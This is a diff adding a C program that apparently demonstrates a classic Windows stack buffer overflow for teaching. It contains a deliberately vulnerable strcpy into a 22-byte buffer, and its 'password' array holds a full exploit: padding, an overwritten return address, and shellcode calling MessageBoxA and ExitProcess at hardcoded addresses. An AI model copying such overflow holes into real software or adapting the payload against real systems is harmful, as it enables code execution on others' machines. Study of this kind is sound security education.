@@ -1,0 +1,41 @@
+#include"stdio.h"
+#include"string.h"
+#include <windows.h>
+#define PASSWORD "1234567"
+
+char password[1024] = "\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31"
+                       "\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31"
+                       "\x34\x33\x32\x31\x34\x33\x32\x31\x13\xA3\xD9\x77"
+                       "\x33\xDB\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69"
+                       "\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77"
+                       "\xFF\xD0\x53\xB8\xA2\xBF\x81\x7C\xFF\xD0";
+
+int verify_password (char *password)
+{
+    int authenticated;
+    char buffer[22];// add local buff    注意这个buffer大小为22，所以覆盖的时候4321的个数问题，详细分析可参看reference
+    authenticated=strcmp(password,PASSWORD);
+    strcpy(buffer,password);//over flowed here! 
+    return authenticated;
+}
+
+void main()
+{
+    int valid_flag=0;
+    LoadLibrary("user32.dll");//prepare for messagebox
+    while(1)
+    {
+
+        valid_flag = verify_password(password);
+
+        if(valid_flag)
+        {
+            printf("incorrect password!\n\n");
+        }
+        else
+        {
+            printf("Congratulation! You have passed the verification!\n");
+            break;
+        }
+    }
+}
